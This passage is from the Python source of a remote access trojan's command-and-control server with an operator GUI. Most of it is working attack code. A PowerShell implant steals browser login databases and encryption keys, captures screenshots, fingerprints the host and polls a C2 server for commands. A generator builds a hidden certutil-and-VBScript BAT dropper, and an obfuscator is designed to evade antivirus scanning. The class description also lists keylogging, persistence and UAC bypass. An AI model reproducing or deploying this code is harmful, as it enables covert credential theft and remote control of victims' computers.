            $lp="$bp\$pf\Login Data"
            if(!(Test-Path $lp)){continue}
            try{
              $tmp="$env:TEMP\ld$(Get-Random).db"
              [IO.File]::Copy($lp,$tmp,$true)
              $b64=[Convert]::ToBase64String([IO.File]::ReadAllBytes($tmp))
              Remove-Item $tmp -EA 0
              $out+=@{browser=$bn;profile=$pf;db_b64=$b64;aes_key_b64=$aesB64}
            }catch{}
          }
        }
        @{status='ok';data=$out;count=$out.Count}
      }catch{@{status='error';message=$_.Exception.Message}}
    }
    'screenshot_stream'{try{[Reflection.Assembly]::LoadWithPartialName('System.Windows.F'+'orms')|Out-Null;[Reflection.Assembly]::LoadWithPartialName('System.Draw'+'ing')|Out-Null;$s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;$b=New-Object System.Drawing.Bitmap($s.Width,$s.Height);$g=[System.Drawing.Graphics]::FromImage($b);$g.('Copy'+'FromScreen')($s.Location,[System.Drawing.Point]::Empty,$s.Size);$ms=New-Object System.IO.MemoryStream;$jc=([System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders()|?{$_.MimeType-eq'image/jpeg'})[0];$ep=New-Object System.Drawing.Imaging.EncoderParameters(1);$ep.Param[0]=New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality,[long]20);$b.Save($ms,$jc,$ep);$g.Dispose();$b.Dispose();@{status='ok';data=[Convert]::ToBase64String($ms.ToArray());encoding='base64'}}catch{@{status='error';message=$_.Exception.Message}}}
    default{@{status='error';message="Unknown: $t"}}
  }
}
$_dbg="$env:TEMP\c2d$PID.log"
function FDBG($m){try{"$(Get-Date -Format 'HH:mm:ss.fff') $m"|Out-File $_dbg -Append -Encoding UTF8}catch{}}
$_mx=$null
try{$_mx=New-Object System.Threading.Mutex($false,'Global\WinUpdateSvc2024')}catch{
  try{$_mx=New-Object System.Threading.Mutex($false,'Local\WinUpdateSvc2024')}catch{}
}
if(-not $_mx){FDBG 'EXIT:mutex_null';exit}
$_owned=$false
try{$_owned=$_mx.WaitOne(0,$false)}catch{$_owned=$true}
if(-not $_owned){FDBG 'EXIT:mutex_already_owned';exit}
FDBG "START url=$_URL"
try{
  while($true){
    try{
      FDBG 'collecting_quick_info'
      $_ov='?';try{$_ov=(gwmi ('Win32_Oper'+'atingSystem') -EA 0).Caption}catch{}
      $_cpu='?';try{$_cpu=(gwmi ('Win32_Pro'+'cessor') -EA 0|select -First 1).Name}catch{}
      $_ram='?';try{$_ram=[math]::Round((gwmi ('Win32_Comput'+'erSystem') -EA 0).TotalPhysicalMemory/1GB,1)}catch{}
      $_lip='?';try{$_lip=([System.Net.Dns]::GetHostAddresses($env:COMPUTERNAME)|?{$_.AddressFamily -eq 'InterNetwork'}|select -First 1).IPAddressToString}catch{}
      $_pip='?';try{$_wr=[System.Net.HttpWebRequest]::Create('https://api.ipify.org');$_wr.Timeout=2500;$_rs=$_wr.GetResponse();$_sr=New-Object System.IO.StreamReader($_rs.GetResponseStream());$_pip=$_sr.ReadToEnd().Trim();$_sr.Close();$_rs.Close()}catch{}
      $_adm=$false;try{$_adm=([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)}catch{}
      FDBG "quick_info os=$_ov cpu=$_cpu lip=$_lip pip=$_pip"
      $reg=@{token='__TOKEN__';hostname=$env:COMPUTERNAME;username=$env:USERNAME;domain=$env:USERDOMAIN;architecture=$env:PROCESSOR_ARCHITECTURE;os='Windows';os_release=$_ov;cpu_model=$_cpu;ram_gb=$_ram;local_ip=$_lip;public_ip=$_pip;is_admin=$_adm}
      FDBG 'posting_register'
      $resp=HPost "$_URL/r" $reg
      FDBG "register_resp_null=$($resp -eq $null)"
      if(-not $resp){throw 'register failed'}
      $_SID=$resp.session_id
      if(-not $_SID){throw "no session_id resp=$($resp|ConvertTo-Json -Compress)"}
      FDBG "session_id=$_SID"
      while($true){
        Start-Sleep -Milliseconds 800
        $cmd=HGet "$_URL/c?s=$_SID"
        if(-not $cmd){FDBG 'poll_null';continue}
        $t=[string]$cmd.type
        FDBG "poll_got type=$t"
        if(-not $t -or $t -eq 'wait'){continue}
        if($t -eq 'disconnect'){FDBG 'got_disconnect';break}
        FDBG "cmd_recv type=$t"
        try{
          $result=HC $cmd
          if($result -eq $null){$result=@{status='error';message='null result'}}
          FDBG "cmd_done type=$t status=$($result.status)"
          for($ur=0;$ur-lt 4;$ur++){
            $r=HPost "$_URL/u?s=$_SID" $result
            if($r){FDBG "upload_ok ur=$ur";break}
            FDBG "upload_fail ur=$ur"
            Start-Sleep -Milliseconds 500
          }
        }catch{FDBG "hc_error $($_.Exception.Message)"}
      }
    }catch{FDBG "outer_catch $($_.Exception.Message)"}
    FDBG 'reconnect_sleep'
    Start-Sleep -Seconds 5
  }
}finally{
  try{$_mx.ReleaseMutex()}catch{}
}"""


# ---------------------------------------------------------------------------
# BAT payload generator — certutil decode approach
#
# WHY: The original approach used -EncodedCommand with the PS script encoded as
# UTF-16LE then base64, producing a string of ~22 KB that far exceeds CMD's
# 8,191-character line limit → "The system cannot execute the specified
# program."
#
# FIX: Write the PS script as base64 text lines to a temp file, then use
# certutil -decode to decode it back to the UTF-8 PS1 file, then run PS on
# that file.  Base64 characters (A-Z a-z 0-9 + / =) have no CMD special
# meaning, so the echo lines are perfectly safe.  certutil is available on
# every Windows version from XP onwards.
# ---------------------------------------------------------------------------

def _generate_bat(host, port, token=""):
    """Generate the plain (unobfuscated) .bat payload as a string.

    How it works:
      1. Build the C2 URL from host/port (handles http/https prefixes, ngrok, serveo).
      2. Substitute __URL__ and __TOKEN__ in _PS_TEMPLATE to produce the PS1 script.
      3. Base64-encode the PS1 script and split into 64-char lines.
      4. Write a BAT that:
           a. Generates a random suffix for temp file names (avoids name collisions).
           b. Kills any existing powershell.exe instances.
           c. Uses CMD parenthesis echo block to write the base64 to a .tmp file
              (mimics a PEM certificate block so certutil will decode it).
           d. Runs  certutil -decode <tmp> <ps1>  to produce the actual .ps1.
           e. Creates a tiny VBScript that launches powershell.exe hidden with
              -ep bypass and -w hidden so no console window appears.
           f. Runs the VBScript (wscript //nologo), waits, deletes temp files.
    No Python is needed on the victim; only cmd.exe, certutil, wscript, and
    powershell are used — all present on every Windows version since XP.
    """
    h = host.strip()
    # Build the URL the PS implant will connect back to
    if h.startswith("http://") or h.startswith("https://"):
        url = h.rstrip("/")   # already a full URL (ngrok, etc.)
    elif any(x in h for x in ("ngrok.io", "ngrok-free.app", "ngrok.app", "serveo.net")):
        url = "https://" + h.rstrip("/")   # tunnel service — force HTTPS
    else:
        url = f"http://{h}:{port}"   # plain IP:port — plain HTTP
    ps = (
        _PS_TEMPLATE
        .replace("__URL__",   url)    # bake the C2 URL into the script
        .replace("__TOKEN__", token)  # bake the auth token (may be empty)
    )
    global _current_ps_script
    _current_ps_script = ps.encode("utf-8")   # store so GET /p can serve it
    ps_bytes = ps.encode("utf-8")
    b64      = base64.b64encode(ps_bytes).decode("ascii")
    lines    = [b64[i:i + 64] for i in range(0, len(b64), 64)]  # 64 chars/line = certutil limit

    bat = [
        "@echo off",
        'set "RN=%RANDOM%%RANDOM%"',       # random suffix: prevents file-name collisions
        'set "TF=%TEMP%\\ms%RN%.tmp"',     # temp file for the base64 "PEM" blob
        'set "PF=%TEMP%\\ms%RN%.ps1"',     # decoded PowerShell script destination
        'set "VF=%TEMP%\\ms%RN%.vbs"',     # tiny VBScript launcher (hidden exec)
        'taskkill /F /IM powershell.exe >nul 2>&1',  # kill any existing PS instance
        'ping -n 2 127.0.0.1 >nul',        # 2-second delay (lets old PS fully exit)
        "(",
        "echo -----BEGIN CERTIFICATE-----",  # certutil expects PEM-style header/footer
    ]
    bat.extend(f"echo {ln}" for ln in lines)   # echo each 64-char base64 line into the block
    bat += [
        "echo -----END CERTIFICATE-----",
        ') > "%TF%"',                           # redirect the entire block to the .tmp file
        'certutil -decode "%TF%" "%PF%" >nul 2>&1',  # base64-decode → real .ps1
        'del "%TF%" 2>nul',                     # clean up the base64 blob
        'echo Set ws=CreateObject("WScript.Shell") > "%VF%"',   # VBScript line 1
        'echo ws.Run "powershell -w hidden -ep bypass -NonInteractive -NoProfile -File ""%PF%""",0,False >> "%VF%"',  # line 2
        'wscript //nologo "%VF%"',              # launch VBS → PS runs silently, no console
        'ping -n 3 127.0.0.1 >nul',            # 3-second delay before deleting VBS
        'del "%VF%" 2>nul',                     # clean up the VBScript launcher
        'exit /b',
    ]
    return "\r\n".join(bat) + "\r\n"


# ---------------------------------------------------------------------------
# Batch File Obfuscator  —  Enhanced v3.1  (by AmericanDream)
# All functions included verbatim; integrated into the Payload tab.
# obf_main() preserves the original standalone CLI experience.
#
# OVERVIEW OF THE OBFUSCATION PIPELINE:
#   _generate_run_config()  — builds a per-run 26-char shuffled alphabet and
#       a char-substitution map (each char → %_N% token).
#   _protect()              — replaces %var%, %%~param%, and :labels with
#       NUL-delimited placeholder tokens so char-substitution skips them.
#   _insert_carets()        — sprinkles random ^ escape chars in safe positions.
#   _inject_rem_noise()     — inserts harmless `rem <word>` lines between BAT
#       lines at a configurable density (18% by default).
#   _apply_char_sub()       — replaces each obfuscatable char with its %_N%
#       token; skips NUL-delimited protected blocks.
#   _restore()              — substitutes placeholder tokens back to originals.
#   build_bat()             — assembles the final obfuscated script: obfuscated
#       header + obfuscated payload body.
#   write_with_bom()        — prepends the UTF-16 LE BOM + &cls trick so Windows
#       executes the BAT correctly even with the BOM.
# ---------------------------------------------------------------------------

_CHAR_EXPR_OPTIONS: dict[str, list[str]] = {
    # Characters with only one possible substitution (no env-var alternative found)
    'J': ['J'],
    'G': ['G'],
    'X': ['X'],
    'z': ['z'],
    'S': ['S'],
    'O': ['O'],
    'A': ['A'],
    'H': ['H'],
    'I': ['I'],
    'h': ['h'],
    # Characters that can be sourced from common Windows env-vars via substring syntax
    # e.g. %PUBLIC% = "C:\Users\Public"  → %PUBLIC:~6,1% = 'P', etc.
    # Each list entry is a valid CMD expression that evaluates to that character.
    'g': ['g', '%ALLUSERSPROFILE:~6,1%'],
    'i': ['%PUBLIC:~13,1%', '%COMSPEC:~4,1%'],
    't': ['%COMSPEC:~14,1%'],
    'w': ['%COMSPEC:~8,1%'],
    'b': ['%PUBLIC:~11,1%'],
    'm': ['%COMSPEC:~16,1%'],
    'u': ['%PUBLIC:~10,1%'],
    's': ['%PUBLIC:~4,1%',
          '%COMSPEC:~9,1%',
          '%COMSPEC:~11,1%',
          '%COMSPEC:~13,1%'],
    'e': ['%COMSPEC:~15,1%',
          '%PUBLIC:~5,1%',
          '%COMSPEC:~24,1%'],
    'c': ['%PUBLIC:~14,1%',
          '%COMSPEC:~20,1%'],
    'l': ['%PUBLIC:~12,1%'],
    'o': ['%COMSPEC:~7,1%',
          '%ALLUSERSPROFILE:~5,1%'],
    'n': ['%COMSPEC:~5,1%'],
    'r': ['%PUBLIC:~6,1%',
          '%ALLUSERSPROFILE:~4,1%',
          '%ALLUSERSPROFILE:~7,1%'],
    'd': ['%COMSPEC:~6,1%',
          '%COMSPEC:~22,1%'],
    'a': ['%ALLUSERSPROFILE:~8,1%',
          '%ALLUSERSPROFILE:~11,1%',
          '%ALLUSERSPROFILE:~13,1%'],
}

# All obfuscatable characters (keys of the table above)
_ALL_CHARS: list[str] = list(_CHAR_EXPR_OPTIONS.keys())


def _generate_run_config() -> tuple[str, dict[str, str]]:
    """Produce a per-run randomised 26-char alphabet string and its substitution map.

    The alphabet is shuffled each time so positions 0-25 differ on every run.
    The BAT header uses a FOR /L loop to expand %r:~N,1% into individual chars
    stored as %_0% … %_25%, and the body uses those tokens instead of plain chars.
    Returns (r_string, char_sub_map) where r_string is the shuffled alphabet
    and char_sub_map is {char: '%_N%'} for fast per-character lookup.
    """
    chars = _ALL_CHARS[:]
    random.shuffle(chars)          # different order every time
    r_string = ''.join(chars)
    char_sub_map = {ch: f'%_{i}%' for i, ch in enumerate(r_string)}
    return r_string, char_sub_map


def _get_char_expr(ch: str) -> str:
    """Pick a random env-var expression that evaluates to ch at runtime.
    Falls back to the literal character if no env-var source is available.
    """
    options = _CHAR_EXPR_OPTIONS.get(ch, [ch])
    return random.choice(options)


def _build_hdr_echo_off() -> str:
    """Generate an obfuscated '@echo off' line using env-var substring expressions
    and random ^ carets so static scanners don't see the plain string."""
    e = random.choice(['%COMSPEC:~15,1%', '%PUBLIC:~5,1%', '^e'])
    c = random.choice(['%PUBLIC:~14,1%', '%COMSPEC:~20,1%', '^c'])
    h = '^h'
    o = random.choice(['%COMSPEC:~7,1%', '^o'])
    f = '^f'
    return f'@{e}{c}{h}{o}^ {o}{f}{f}'


def _build_hdr_echo_on(r_string: str) -> str:
    """Generate an obfuscated '@echo on' line using the %_N% substitution tokens."""
    idx = {ch: r_string.index(ch) for ch in ('e', 'c', 'h', 'o', 'n')}

    def _maybe_caret() -> str:
        return '^' if random.random() < 0.5 else ''   # 50% chance of a caret between tokens

    return (
        f'@%_{idx["e"]}%{_maybe_caret()}%_{idx["c"]}%'
        f'{_maybe_caret()}%_{idx["h"]}%{_maybe_caret()}%_{idx["o"]}%'
        f'^ %_{idx["o"]}%{_maybe_caret()}%_{idx["n"]}%'
    )


def _build_hdr_cls(r_string: str) -> str:
    """Generate an obfuscated 'cls' line using the %_N% substitution tokens."""
    idx = {ch: r_string.index(ch) for ch in ('c', 'l', 's')}

    def _maybe_caret() -> str:
        return '^' if random.random() < 0.6 else ''   # 60% chance for denser obfuscation

    return (
        f'{_maybe_caret()}%_{idx["c"]}%'
        f'{_maybe_caret()}%_{idx["l"]}%'
        f'{_maybe_caret()}%_{idx["s"]}%'
    )


def _build_r_header_lines(r_string: str) -> list[str]:
    """Build the 3-part SET lines that define the master r_string in the BAT header.

    The 26-char r_string is split into three ~9-char parts (r1/r2/r3), each
    defined using env-var substring expressions from _CHAR_EXPR_OPTIONS so the
    actual characters are never written literally in the script.
    After construction, r1/r2/r3 are merged into %r% then cleared to save memory.
    """
    parts = [r_string[:9], r_string[9:18], r_string[18:]]
    lines: list[str] = []
    for part_idx, part in enumerate(parts):
        var = f'r{part_idx + 1}'
        tokens: list[str] = []
        for ch in part:
            expr = _get_char_expr(ch)
            # For single-char literals, prepend ^ 70% of the time
            if len(expr) == 1:
                if random.random() < 0.70:
                    expr = '^' + expr
            else:
                # For env-var expressions, prepend ^ 30% of the time
                if random.random() < 0.30:
                    expr = '^' + expr
            tokens.append(expr)
        lines.append(f'SE^t {var}={"".join(tokens)}')
    lines.append('SE^t r=%r1%%r2%%r3%')   # merge three parts into %r%
    lines += ['SE^t r1=', 'SE^t r2=', 'SE^t r3=']   # erase the three partial vars
    return lines


def _build_hdr_shorthand(r_string: str) -> str:
    """Build the FOR /L loop that expands %r% into individual %_0% … %_25% tokens.

    This is the key trick: instead of storing each character individually,
    a single FOR loop iterates 0-25 and uses CALL SET to slice %r:~N,1%.
    Keywords (FOR, IN, DO, CALL, SET) get random internal ^ carets.
    """
    def _caret_word(word: str) -> str:
        if len(word) <= 1:
            return word
        pos = random.randint(1, len(word) - 1)   # inject ^ at a random internal position
        return word[:pos] + '^' + word[pos:]

    FOR  = _caret_word('FOR')
    IN   = _caret_word('IN')
    DO   = _caret_word('DO')
    CALL = _caret_word('CALL')
    SET  = _caret_word('SET')
    return f'{FOR} /L %%i {IN} (0,1,25) {DO} {CALL} {SET} _%%i=%%r:~%%i,1%%'


def _gen_junk_group(n_min: int = 2, n_max: int = 3) -> list[str]:
    """Generate 2-3 meaningless SE^t statements with random names and empty values.
    These act as decoy lines to disrupt pattern-matching scanners.
    """
    alphabet = 'abcdefghijklmnopqrstuvwxyz0123456789'
    lines = []
    for _ in range(random.randint(n_min, n_max)):
        name = '__' + ''.join(random.choices(alphabet, k=random.randint(4, 8)))
        lines.append(f'SE^t {name}=')   # empty variable assignment — does nothing
    return lines


def _protect(text: str) -> tuple[str, dict[str, str]]:
    """Replace %var%, %%~param%, and :label lines with NUL-delimited placeholder tokens.

    This shields these constructs from _apply_char_sub() which would otherwise
    replace characters inside them, breaking variable names and jump labels.
    Returns (modified_text, token_dict) — _restore() puts them back afterward.
    """
    tokens: dict[str, str] = {}
    ctr = [0]

    def _tok(val: str) -> str:
        """Wrap val in a NUL-delimited key and record it in the token dict."""
        key = f'\x00K{ctr[0]:06d}\x00'
        tokens[key] = val
        ctr[0] += 1
        return key

    # Protect %%~dpn0 style parameter expansions (for loops, argument parsing)
    text = re.sub(r'%%~[^\s%\r\n]*', lambda m: _tok(m.group()), text)
    # Protect %~dpn0 style parameter expansions
    text = re.sub(r'%~[^\s%\r\n]*',  lambda m: _tok(m.group()), text)
    # Protect all %variable% references
    text = re.sub(r'%[^%\r\n]+%',    lambda m: _tok(m.group()), text)
    # Protect :label lines (but not :: comments — those are already inert)
    lines = text.split('\n')
    for idx, line in enumerate(lines):
        stripped = line.lstrip()
        if stripped.startswith(':') and not stripped.startswith('::'):
            lines[idx] = _tok(line)
    text = '\n'.join(lines)
    return text, tokens


def _restore(text: str, tokens: dict[str, str]) -> str:
    """Substitute all NUL-delimited placeholder tokens back to their original values."""
    for key, val in tokens.items():
        text = text.replace(key, val)
    return text


def _apply_char_sub(text: str, char_sub_map: dict[str, str]) -> str:
    """Replace each obfuscatable character with its %_N% token.

    Skips NUL-delimited blocks created by _protect() so that protected
    variable references and labels are passed through verbatim.
    The character-by-character loop is O(n) and preserves all other characters.
    """
    result: list[str] = []
    i = 0
    n = len(text)
    while i < n:
        ch = text[i]
        if ch == '\x00':
            # NUL-delimited protected block — copy it verbatim, skip to closing NUL
            end = text.index('\x00', i + 1)
            result.append(text[i:end + 1])
            i = end + 1
        elif ch in char_sub_map:
            result.append(char_sub_map[ch])   # replace with the %_N% token
            i += 1
        else:
            result.append(ch)   # non-obfuscatable character — pass through unchanged
            i += 1
    return ''.join(result)


def _inject_rem_noise(text: str, density: float = 0.18) -> str:
    """Insert `rem <random_word>` lines between existing BAT lines at the given density.

    Noise lines are never inserted:
      - after NUL-delimited protected blocks (would corrupt token boundaries)
      - after lines ending with ^ (caret continuation — would break the command)
    This increases file size and disrupts line-count-based heuristics.
    """
    noise_pool = [
        'initialize', 'configure', 'setup', 'validate', 'process',
        'execute', 'compute', 'generate', 'transform', 'encode',
        'decode', 'iterate', 'resolve', 'dispatch', 'invoke',
        'sync', 'allocate', 'register', 'bootstrap', 'finalize',
    ]
    lines = text.split('\n')
    result: list[str] = []
    for line in lines:
        result.append(line)
        stripped = line.strip()
        is_label_token = stripped.startswith('\x00') and stripped.endswith('\x00')
        ends_with_caret = line.rstrip().endswith('^')
        if stripped and not is_label_token and not ends_with_caret:
            if random.random() < density:
                result.append(f'rem {random.choice(noise_pool)}')
    return '\n'.join(result)


def _insert_carets(text: str, count: int) -> str:
    """Inject `count` random ^ escape characters at safe positions in the text.

    Safe positions are those where:
      - not inside a NUL-delimited protected block
      - not at the very start or end of the text
      - neither the current nor the next character is a newline or NUL
    Random ^ characters are legal CMD escape chars and are ignored by the
    interpreter — they disrupt simple string-matching without changing behaviour.
    """
    safe: list[int] = []
    in_tok = False
    for idx, ch in enumerate(text):
        if ch == '\x00':
            in_tok = not in_tok   # toggle: entering / leaving a protected block
            continue
        if in_tok or idx == 0 or idx >= len(text) - 1:
            continue
        next_ch = text[idx + 1]
        if ch in ('\n', '\r') or next_ch in ('\n', '\r', '\x00'):
            continue
        safe.append(idx)
    if not safe or count <= 0:
        return text
    count = min(count, len(safe))   # can't insert more carets than safe positions
    chosen = sorted(random.sample(safe, count))
    chars = list(text)
    for offset, pos in enumerate(chosen):
        chars.insert(pos + offset + 1, '^')   # offset accounts for previously inserted chars
    return ''.join(chars)


# UTF-16 LE BOM followed by &cls — this makes Windows treat the file as UTF-16,
# but CMD executes &cls as a command before parsing the rest, clearing the screen.
# The rest of the file is ASCII-compatible so CMD processes it correctly.
BOM_PREFIX = b'\xff\xfe&cls\r\n'


def build_bat(payload: str, r_string: str) -> str:
    """Assemble the final obfuscated BAT content: header + obfuscated payload body.

    Header order:
      1. @echo off  (obfuscated)
      2. r1/r2/r3 SET lines  (env-var expressions define the master alphabet)
      3. Junk variable group A
      4. FOR /L shorthand  (expands %r% into %_0% … %_25%)
      5. SE^t r=  (erase the now-redundant master variable)
      6. Junk variable group B
      7. cls  (clear the screen — visual stealth)
      8. @echo on  (obfuscated — re-enables echo for the payload)
    """
    hdr_echo_off   = _build_hdr_echo_off()
    r_lines        = _build_r_header_lines(r_string)
    junk_a         = _gen_junk_group(2, 3)
    hdr_shorthand  = _build_hdr_shorthand(r_string)
    hdr_erase_r    = 'SE^t r='              # erase the master alphabet variable
    junk_b         = _gen_junk_group(2, 3)
    hdr_cls        = _build_hdr_cls(r_string)
    hdr_echo_on    = _build_hdr_echo_on(r_string)
    header_lines = [
        hdr_echo_off,
        *r_lines,
        *junk_a,
        hdr_shorthand,
        hdr_erase_r,
        *junk_b,
        hdr_cls,
        hdr_echo_on,
    ]
    return '\n'.join(header_lines) + '\n' + payload + '\n'


def write_with_bom(filepath: str, content: str) -> None:
    """Write the obfuscated BAT to disk with the UTF-16 LE BOM + &cls prefix.
    Content is encoded as ASCII (non-ASCII chars replaced with '?') because
    the obfuscated body only contains ASCII-safe CMD characters.
    """
    body = content.encode('ascii', errors='replace')
    with open(filepath, 'wb') as fh:
        fh.write(BOM_PREFIX + body)


def _run_obf_pipeline(source_bat_text: str,
                      use_carets: bool = False,
                      caret_count: int = 0) -> bytes:
    """
    Run the full obfuscation pipeline on source_bat_text and return the
    final obfuscated file content as bytes (BOM prefix included).
    Usable without any CLI interaction.

    IMPORTANT: The certutil-based BAT payload contains hundreds of base64
    echo lines plus certutil/del/start/timeout commands.  These lines MUST
    be shielded from char-substitution before the obfuscator runs, because
    char-substitution replaces base64 characters (A,G,I,S,O,a,e,s,t,…) with
    %_N% tokens.  Even though CMD expands those tokens back to the original
    chars at runtime, the %_N% form can exceed CMD's per-line echo buffer for
    long base64 lines, producing garbage in the temp file that certutil then
    decodes into a corrupted .ps1 — which is exactly the error the user saw.

    Fix: pre-tokenise every susceptible line with NUL-delimited placeholders
    before _protect() runs.  _apply_char_sub() skips NUL-delimited blocks,
    and _restore() puts the original lines back verbatim.
    """
    r_string, char_sub_map = _generate_run_config()

    extra_tokens: dict[str, str] = {}
    ctr = [0]

    def _pretok(val: str) -> str:
        key = f'\x00B{ctr[0]:06d}\x00'
        extra_tokens[key] = val
        ctr[0] += 1
        return key

    _SHIELD_RE = re.compile(
        r'^(?:@?echo\b|del\b|start\b|timeout\b|if\b|set\b|wscript\b|exit\b|\(|\))',
        re.IGNORECASE,
    )
    lines = source_bat_text.split('\r\n')
    for idx, line in enumerate(lines):
        if _SHIELD_RE.match(line.strip()):
            lines[idx] = _pretok(line)
    source_bat_text = '\r\n'.join(lines)

    protected, tokens = _protect(source_bat_text)
    tokens.update(extra_tokens)

    if use_carets and caret_count > 0:
        protected = _insert_carets(protected, caret_count)
    protected = _inject_rem_noise(protected)
    subbed    = _apply_char_sub(protected, char_sub_map)
    payload   = _restore(subbed, tokens)
    content   = build_bat(payload, r_string)
    return BOM_PREFIX + content.encode('ascii', errors='replace')


def obf_main() -> None:
    """
    Standalone CLI obfuscator — original main() function preserved verbatim,
    renamed to obf_main() to avoid collision with the C2 server entry point.
    Launch via the 'Open Standalone Obfuscator' button in the Payload tab.
    """
    if not HAS_OBF_CLI:
        print("Required packages not available: pyfiglet easygui tqdm colorama")
        return

    print(Fore.CYAN   + pyfiglet.figlet_format("batch obuscator by AmericanDream"))
    print(Fore.YELLOW + "  Enhanced Batch Obfuscator  v3.1")
    print(Fore.WHITE  + '\u2500' * 60)
    print()

    print(Fore.GREEN + "please pick a batch file")
    time.sleep(1)

    filepath = easygui.fileopenbox(
        title="Select Batch File to Obfuscate",
        default="*.bat",
        filetypes=[["*.bat", "*.cmd", "Batch files"]]
    )
    if not filepath or not os.path.isfile(filepath):
        print(Fore.RED + "No file selected. Exiting.")
        sys.exit(0)

    with open(filepath, 'r', encoding='utf-8', errors='replace') as fh:
        dna = fh.read()

    orig_bytes = len(dna.encode('utf-8'))
    print(Fore.GREEN + f"Loaded: {filepath}  ({orig_bytes:,} bytes)")
    print()

    yorn = input(
        Fore.WHITE +
        "would you like to add random ^ to the obfuscation"
        " (may break script. not recommended) y or n: "
    ).strip().lower()

    if yorn == 'n':
        use_carets, caret_count = False, 0
    elif yorn == 'y':
        use_carets = True
        raw = input(
            "please enter the number of ^ you want"
            " (you can not have more than the length of your text): "
        ).strip()
        caret_count = min(int(raw), len(dna) - 1)
    else:
        print(Fore.RED + "that is not a correct option. now exiting...")
        sys.exit(0)

    name = input(
        Fore.WHITE + "Enter output file name (do not include extension): "
    ).strip()
    if not name:
        name = "obfuscated"
    output_path = name + ".bat"

    print()

    with tqdm(
        total=6,
        bar_format=(
            '{l_bar}' + Fore.CYAN + '{bar}' + Style.RESET_ALL + ' {n_fmt}/{total_fmt}'
        ),
        ncols=60
    ) as pbar:
        pbar.set_description("Generating config  ")
        r_string, char_sub_map = _generate_run_config()
        pbar.update(1)

        pbar.set_description("Protecting tokens  ")
        protected, tokens = _protect(dna)
        pbar.update(1)

        pbar.set_description("Caret injection    ")
        if use_carets:
            protected = _insert_carets(protected, caret_count)
        pbar.update(1)

        pbar.set_description("REM noise inject   ")
        protected = _inject_rem_noise(protected)
        pbar.update(1)

        pbar.set_description("Char substitution  ")
        subbed  = _apply_char_sub(protected, char_sub_map)
        payload = _restore(subbed, tokens)
        pbar.update(1)

        pbar.set_description("Writing output     ")
        content = build_bat(payload, r_string)
        write_with_bom(output_path, content)
        pbar.update(1)

    out_bytes = os.path.getsize(output_path)
    print()
    print(Fore.GREEN  + f'Saved to "{output_path}"')
    print(Fore.GREEN  + f"Original : {orig_bytes:>8,} bytes")
    print(Fore.GREEN  + f"Output   : {out_bytes:>8,} bytes  "
                        f"({out_bytes / max(orig_bytes, 1):.1f}x ratio)")
    print()
    print(Fore.YELLOW + "The operation is complete")
    print(Fore.YELLOW + "Thank you for using, now exiting...")
    time.sleep(2)


# ---------------------------------------------------------------------------
# GUI helpers — thin wrappers that apply the Tokyo Night theme to every widget
# so individual tab builders don't need to repeat colour/font arguments.
# ---------------------------------------------------------------------------

def _btn(parent, text, command, fg=None, bg=None, width=None, **kw):
    """Create a flat, themed tk.Button with hand cursor and hover highlight.
    fg defaults to C["text"]; bg defaults to C["btn"].  Extra kwargs are
    forwarded to tk.Button so callers can override any property.
    """
    props = dict(
        text=text, command=command, relief="flat", cursor="hand2",
        font=FONT_UI_SM, padx=10, pady=5,
        fg=fg if fg else C["text"],
        bg=bg if bg else C["btn"],
        activeforeground=fg if fg else C["text"],
        activebackground=C["btn_hover"],   # slightly brighter on click / hover
    )
    props.update(kw)   # allow callers to override any property
    if width is not None:
        props["width"] = width
    return tk.Button(parent, **props)


def _label(parent, text, fg=None, font=None, **kw):
    """Create a themed tk.Label with optional fg and font overrides."""
    return tk.Label(
        parent, text=text,
        fg=fg if fg else C["text3"],
        bg=C["bg2"],
        font=font if font else FONT_UI_SM,
        **kw,
    )


def _entry(parent, textvariable=None, width=20, **kw):
    """Create a flat, themed tk.Entry with dark background.
    Extra kwargs (e.g. show="*" for password fields) override the defaults.
    """
    defaults = {
        "bg":               C["entry"],
        "fg":               C["text"],
        "insertbackground": C["text"],   # cursor colour inside the entry
        "relief":           "flat",
        "font":             FONT_UI_SM,
    }
    defaults.update(kw)   # allow callers to override e.g. state="disabled"
    return tk.Entry(parent, textvariable=textvariable, width=width, **defaults)


def _sep(parent):
    """Create a 1-pixel horizontal separator line using the border colour."""
    return tk.Frame(parent, bg=C["border"], height=1)


def _frame(parent, bg=None, **kw):
    """Create a themed tk.Frame; bg defaults to C["bg2"] (main panel colour)."""
    return tk.Frame(parent, bg=bg if bg else C["bg2"], **kw)


# ---------------------------------------------------------------------------
# ServerApp
# ---------------------------------------------------------------------------

class ServerApp:
    """Main GUI application — creates and manages the entire C2 operator interface.

    The GUI is built with Tkinter and organised into a multi-tab notebook:
      Shell       — interactive cmd.exe shell on the victim
      System      — OS info, persistence (Run-key / Scheduled Task / WMI), system actions
      Files       — remote file browser (navigate, download, upload, delete)
      Surveillance— screenshot, live stream, keylogger, clipboard, active window, drives
      Processes   — running process list with kill support
      Post-Exploit— advanced post-exploitation (credentials, UAC bypass, registry, etc.)
      AI Analyst  — local AI assistant (Ollama) or OpenAI API for analysis/suggestions
      Tunnel      — ngrok / SSH reverse-tunnel management
      Payload     — BAT payload generator + obfuscator

    Threading model:
      • The main thread runs the Tkinter event loop (root.mainloop()).
      • All blocking operations (network commands, file I/O) run in daemon threads.
      • Background threads communicate back to the GUI via self.gui_queue.
      • _process_queue() is scheduled every 80 ms via root.after() to drain the queue
        and perform GUI updates safely on the main thread.
    """

    def __init__(self):
        # ── Root window setup ─────────────────────────────────────────────────
        self.root = tk.Tk()
        self.root.title("\u2623 AmericanDream7 | RAT C2 Server | Lab Edition v2.1")
        self.root.geometry("1200x760")
        self.root.minsize(1000, 640)
        self.root.configure(bg=C["bg"])
        self._set_app_icon()   # draws a biohazard-inspired icon with PIL

        # ── Application state ─────────────────────────────────────────────────
        self.clients            = {}        # client_id (int) → ClientSession
        self._selected_client   = None     # currently highlighted ClientSession (or None)
        self.gui_queue          = queue.Queue()   # thread-safe message queue for GUI updates
        self.server             = None     # RATServer instance (None when stopped)
        self._server_running    = False    # tracks whether the HTTP C2 server is active
        self._file_current_path = ""       # path currently open in the Files tab
        self._file_items        = []       # list of file entries from the last file_list result
        self._proc_items        = []       # list of process entries from the last process_list
        self._proc_detached     = []       # PIDs of processes killed in the current session
